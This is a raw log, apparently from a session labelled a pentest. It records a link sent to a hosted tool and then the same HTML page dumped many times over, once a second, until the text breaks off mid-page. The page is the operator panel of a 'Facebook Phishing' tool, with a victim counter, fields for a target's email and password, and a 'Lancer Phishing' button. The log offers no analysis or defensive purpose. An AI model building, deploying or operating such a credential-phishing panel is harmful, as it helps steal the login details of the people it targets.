=== SESSION PENTEST Mon Mar  9 06:38:31 CAT 2026 ===
Lien envoyé: https://leofish-tool-v1-0.onrender.com/index.php/index.php?session=1773031111_462acc1ab0069726
06:39:05 - <!DOCTYPE html>
06:39:05 - <html>
06:39:05 - <head>
06:39:05 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:05 -     <meta http-equiv="refresh" content="5">
06:39:05 -     <style>
06:39:05 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:05 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:05 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:05 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:05 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:05 -         .email{color:#ff0;font-weight:bold;}
06:39:05 -         .ip{color:#0ff;}
06:39:05 -         .time{color:#ff6600;}
06:39:05 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:05 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:05 -         .btn:hover{background:#0a0;}
06:39:05 -         .btn-red{background:#f00;color:#fff;}
06:39:05 -     </style>
06:39:05 - </head>
06:39:05 - <body>
06:39:05 -     <div class="header">
06:39:05 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:05 -     </div>
06:39:05 -     <div class="console" id="console">
06:39:05 -             </div>
06:39:05 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:05 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:05 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:05 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:05 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:05 -     </form>
06:39:05 -     <script>
06:39:05 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:05 -     </script>
06:39:05 - </body>
06:39:05 - </html>
06:39:06 - <!DOCTYPE html>
06:39:06 - <html>
06:39:06 - <head>
06:39:06 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:06 -     <meta http-equiv="refresh" content="5">
06:39:06 -     <style>
06:39:06 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:06 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:06 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:06 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:06 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:06 -         .email{color:#ff0;font-weight:bold;}
06:39:06 -         .ip{color:#0ff;}
06:39:06 -         .time{color:#ff6600;}
06:39:06 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:06 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:06 -         .btn:hover{background:#0a0;}
06:39:06 -         .btn-red{background:#f00;color:#fff;}
06:39:06 -     </style>
06:39:06 - </head>
06:39:06 - <body>
06:39:06 -     <div class="header">
06:39:06 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:06 -     </div>
06:39:06 -     <div class="console" id="console">
06:39:06 -             </div>
06:39:06 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:06 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:06 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:06 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:06 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:06 -     </form>
06:39:06 -     <script>
06:39:06 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:06 -     </script>
06:39:06 - </body>
06:39:06 - </html>
06:39:07 - <!DOCTYPE html>
06:39:07 - <html>
06:39:07 - <head>
06:39:07 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:07 -     <meta http-equiv="refresh" content="5">
06:39:07 -     <style>
06:39:07 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:07 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:07 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:07 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:07 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:07 -         .email{color:#ff0;font-weight:bold;}
06:39:07 -         .ip{color:#0ff;}
06:39:07 -         .time{color:#ff6600;}
06:39:07 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:07 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:07 -         .btn:hover{background:#0a0;}
06:39:07 -         .btn-red{background:#f00;color:#fff;}
06:39:07 -     </style>
06:39:07 - </head>
06:39:07 - <body>
06:39:07 -     <div class="header">
06:39:07 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:07 -     </div>
06:39:07 -     <div class="console" id="console">
06:39:07 -             </div>
06:39:07 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:07 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:07 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:07 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:07 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:07 -     </form>
06:39:07 -     <script>
06:39:07 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:07 -     </script>
06:39:07 - </body>
06:39:07 - </html>
06:39:08 - <!DOCTYPE html>
06:39:08 - <html>
06:39:08 - <head>
06:39:08 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:09 -     <meta http-equiv="refresh" content="5">
06:39:09 -     <style>
06:39:09 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:09 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:09 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:09 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:09 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:09 -         .email{color:#ff0;font-weight:bold;}
06:39:09 -         .ip{color:#0ff;}
06:39:09 -         .time{color:#ff6600;}
06:39:09 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:09 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:09 -         .btn:hover{background:#0a0;}
06:39:09 -         .btn-red{background:#f00;color:#fff;}
06:39:09 -     </style>
06:39:09 - </head>
06:39:09 - <body>
06:39:09 -     <div class="header">
06:39:09 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:09 -     </div>
06:39:09 -     <div class="console" id="console">
06:39:09 -             </div>
06:39:09 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:09 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:09 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:09 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:09 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:09 -     </form>
06:39:09 -     <script>
06:39:09 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:09 -     </script>
06:39:09 - </body>
06:39:09 - </html>
06:39:10 - <!DOCTYPE html>
06:39:10 - <html>
06:39:10 - <head>
06:39:10 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:10 -     <meta http-equiv="refresh" content="5">
06:39:10 -     <style>
06:39:10 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:10 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:10 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:10 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:10 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:10 -         .email{color:#ff0;font-weight:bold;}
06:39:10 -         .ip{color:#0ff;}
06:39:10 -         .time{color:#ff6600;}
06:39:10 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:10 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:10 -         .btn:hover{background:#0a0;}
06:39:10 -         .btn-red{background:#f00;color:#fff;}
06:39:10 -     </style>
06:39:10 - </head>
06:39:10 - <body>
06:39:10 -     <div class="header">
06:39:10 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:10 -     </div>
06:39:10 -     <div class="console" id="console">
06:39:10 -             </div>
06:39:10 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:10 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:10 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:10 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:10 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:10 -     </form>
06:39:10 -     <script>
06:39:10 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:10 -     </script>
06:39:10 - </body>
06:39:10 - </html>
06:39:11 - <!DOCTYPE html>
06:39:11 - <html>
06:39:11 - <head>
06:39:11 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:11 -     <meta http-equiv="refresh" content="5">
06:39:11 -     <style>
06:39:11 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:11 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:11 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:11 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:11 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:11 -         .email{color:#ff0;font-weight:bold;}
06:39:11 -         .ip{color:#0ff;}
06:39:11 -         .time{color:#ff6600;}
06:39:11 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:11 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:11 -         .btn:hover{background:#0a0;}
06:39:11 -         .btn-red{background:#f00;color:#fff;}
06:39:11 -     </style>
06:39:11 - </head>
06:39:11 - <body>
06:39:11 -     <div class="header">
06:39:11 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:11 -     </div>
06:39:11 -     <div class="console" id="console">
06:39:11 -             </div>
06:39:11 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:11 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:11 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:11 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:11 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:11 -     </form>
06:39:11 -     <script>
06:39:11 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:11 -     </script>
06:39:11 - </body>
06:39:11 - </html>
06:39:12 - <!DOCTYPE html>
06:39:12 - <html>
06:39:12 - <head>
06:39:12 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:12 -     <meta http-equiv="refresh" content="5">
06:39:12 -     <style>
06:39:12 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:12 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:12 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:12 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:12 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:12 -         .email{color:#ff0;font-weight:bold;}
06:39:12 -         .ip{color:#0ff;}
06:39:12 -         .time{color:#ff6600;}
06:39:12 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:12 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:12 -         .btn:hover{background:#0a0;}
06:39:12 -         .btn-red{background:#f00;color:#fff;}
06:39:12 -     </style>
06:39:12 - </head>
06:39:12 - <body>
06:39:12 -     <div class="header">
06:39:12 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:12 -     </div>
06:39:12 -     <div class="console" id="console">
06:39:12 -             </div>
06:39:12 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:12 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:12 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:12 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:12 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:12 -     </form>
06:39:12 -     <script>
06:39:12 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:12 -     </script>
06:39:12 - </body>
06:39:12 - </html>
06:39:13 - <!DOCTYPE html>
06:39:13 - <html>
06:39:13 - <head>
06:39:13 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:13 -     <meta http-equiv="refresh" content="5">
06:39:13 -     <style>
06:39:13 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:13 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:13 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:13 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:13 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:13 -         .email{color:#ff0;font-weight:bold;}
06:39:13 -         .ip{color:#0ff;}
06:39:13 -         .time{color:#ff6600;}
06:39:13 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:13 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:13 -         .btn:hover{background:#0a0;}
06:39:13 -         .btn-red{background:#f00;color:#fff;}
06:39:13 -     </style>
06:39:13 - </head>
06:39:13 - <body>
06:39:13 -     <div class="header">
06:39:13 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:13 -     </div>
06:39:13 -     <div class="console" id="console">
06:39:13 -             </div>
06:39:13 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:13 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:13 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:13 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:13 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:13 -     </form>
06:39:13 -     <script>
06:39:13 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:13 -     </script>
06:39:13 - </body>
06:39:13 - </html>
06:39:14 - <!DOCTYPE html>
06:39:14 - <html>
06:39:14 - <head>
06:39:14 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:14 -     <meta http-equiv="refresh" content="5">
06:39:14 -     <style>
06:39:14 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:14 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:14 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:14 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:14 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:14 -         .email{color:#ff0;font-weight:bold;}
06:39:14 -         .ip{color:#0ff;}
06:39:14 -         .time{color:#ff6600;}
06:39:14 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:14 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:14 -         .btn:hover{background:#0a0;}
06:39:14 -         .btn-red{background:#f00;color:#fff;}
06:39:14 -     </style>
06:39:14 - </head>
06:39:14 - <body>
06:39:14 -     <div class="header">
06:39:14 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:14 -     </div>
06:39:14 -     <div class="console" id="console">
06:39:14 -             </div>
06:39:14 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:14 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:14 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:14 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:14 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:14 -     </form>
06:39:14 -     <script>
06:39:14 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:14 -     </script>
06:39:14 - </body>
06:39:14 - </html>
06:39:15 - <!DOCTYPE html>
06:39:15 - <html>
06:39:15 - <head>
06:39:15 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:15 -     <meta http-equiv="refresh" content="5">
06:39:15 -     <style>
06:39:15 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:15 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:15 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:15 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:15 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:15 -         .email{color:#ff0;font-weight:bold;}
06:39:16 -         .ip{color:#0ff;}
06:39:16 -         .time{color:#ff6600;}
06:39:16 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:16 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:16 -         .btn:hover{background:#0a0;}
06:39:16 -         .btn-red{background:#f00;color:#fff;}
06:39:16 -     </style>
06:39:16 - </head>
06:39:16 - <body>
06:39:16 -     <div class="header">
06:39:16 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:16 -     </div>
06:39:16 -     <div class="console" id="console">
06:39:16 -             </div>
06:39:16 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:16 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:16 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:16 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:16 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:16 -     </form>
06:39:16 -     <script>
06:39:16 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:16 -     </script>
06:39:16 - </body>
06:39:16 - </html>
06:39:17 - <!DOCTYPE html>
06:39:17 - <html>
06:39:17 - <head>
06:39:17 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:17 -     <meta http-equiv="refresh" content="5">
06:39:17 -     <style>
06:39:17 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:17 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:17 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:17 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:17 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:17 -         .email{color:#ff0;font-weight:bold;}
06:39:17 -         .ip{color:#0ff;}
06:39:17 -         .time{color:#ff6600;}
06:39:17 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:17 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:17 -         .btn:hover{background:#0a0;}
06:39:17 -         .btn-red{background:#f00;color:#fff;}
06:39:17 -     </style>
06:39:17 - </head>
06:39:17 - <body>
06:39:17 -     <div class="header">
06:39:17 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:17 -     </div>
06:39:17 -     <div class="console" id="console">
06:39:17 -             </div>
06:39:17 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:17 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:17 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:17 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:17 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:17 -     </form>
06:39:17 -     <script>
06:39:17 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:17 -     </script>
06:39:17 - </body>
06:39:17 - </html>
06:39:18 - <!DOCTYPE html>
06:39:18 - <html>
06:39:18 - <head>
06:39:18 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:18 -     <meta http-equiv="refresh" content="5">
06:39:18 -     <style>
06:39:18 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:18 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:18 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:18 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:18 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:18 -         .email{color:#ff0;font-weight:bold;}
06:39:18 -         .ip{color:#0ff;}
06:39:18 -         .time{color:#ff6600;}
06:39:18 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:18 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:18 -         .btn:hover{background:#0a0;}
06:39:18 -         .btn-red{background:#f00;color:#fff;}
06:39:18 -     </style>
06:39:18 - </head>
06:39:18 - <body>
06:39:18 -     <div class="header">
06:39:18 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:18 -     </div>
06:39:18 -     <div class="console" id="console">
06:39:18 -             </div>
06:39:18 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:18 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:18 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:18 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:18 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:18 -     </form>
06:39:18 -     <script>
06:39:18 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:18 -     </script>
06:39:18 - </body>
06:39:18 - </html>
06:39:19 - <!DOCTYPE html>
06:39:19 - <html>
06:39:19 - <head>
06:39:19 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:19 -     <meta http-equiv="refresh" content="5">
06:39:19 -     <style>
06:39:19 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:19 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:19 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:19 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:19 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:19 -         .email{color:#ff0;font-weight:bold;}
06:39:19 -         .ip{color:#0ff;}
06:39:19 -         .time{color:#ff6600;}
06:39:19 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:19 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:19 -         .btn:hover{background:#0a0;}
06:39:19 -         .btn-red{background:#f00;color:#fff;}
06:39:19 -     </style>
06:39:19 - </head>
06:39:19 - <body>
06:39:19 -     <div class="header">
06:39:19 -         🔥 <span style="color:#f00">HACKER TERMINAL</span> | Facebook Phishing | <span id="count">0</span> victims
06:39:19 -     </div>
06:39:19 -     <div class="console" id="console">
06:39:19 -             </div>
06:39:19 -     <form method="POST" action="index.php" target="_blank" style="position:fixed;bottom:10px;left:20px;right:20px;">
06:39:19 -         <input name="email" placeholder="👤 Email cible..." autocomplete="off">
06:39:19 -         <input name="password" placeholder="🔑 Password test..." type="password" autocomplete="off">
06:39:19 -         <button type="submit" class="btn">🎣 Lancer Phishing</button>
06:39:19 -         <button type="button" class="btn btn-red" onclick="location.reload()">🔄 Refresh Logs</button>
06:39:19 -     </form>
06:39:19 -     <script>
06:39:19 -     setInterval(() => document.title = '🔥 ' + new Date().toLocaleTimeString(), 1000);
06:39:19 -     </script>
06:39:19 - </body>
06:39:19 - </html>
06:39:20 - <!DOCTYPE html>
06:39:20 - <html>
06:39:20 - <head>
06:39:20 -     <title>🔥 HACKER TERMINAL v2.0</title>
06:39:20 -     <meta http-equiv="refresh" content="5">
06:39:20 -     <style>
06:39:20 -         *{margin:0;padding:0;box-sizing:border-box;}
06:39:20 -         body{background:#000;color:#0f0;font-family:'Courier New',monospace;height:100vh;overflow:hidden;}
06:39:20 -         .header{padding:15px;background:#111;border-bottom:3px solid #0f0;font-size:18px;font-weight:bold;}
06:39:20 -         .console{max-height:75vh;overflow:auto;padding:20px;background:#0a0a0a;border:1px solid #0f0;}
06:39:20 -         .hit{padding:12px;margin:8px 0;background:#111;border-left:5px solid #f00;font-family:monospace;}
06:39:20 -         .email{color:#ff0;font-weight:bold;}
06:39:20 -         .ip{color:#0ff;}
06:39:20 -         .time{color:#ff6600;}
06:39:20 -         input{width:calc(100% - 160px);padding:12px;background:#111;color:#0f0;border:2px solid #0f0;font-family:monospace;font-size:14px;}
06:39:20 -         .btn{padding:12px 20px;background:#0f0;color:#000;border:none;font-weight:bold;cursor:pointer;font-family:monospace;margin:2px;font-size:14px;}
06:39:20 -         .btn:hover{background:#0a0;}
06:39:20 -         .btn-red{background:#f00;color:#fff;}
06:39:20 -     </style>
06:39:20 - </head>
06:39:20 - <body>
06:39:20 -     <div class="header">
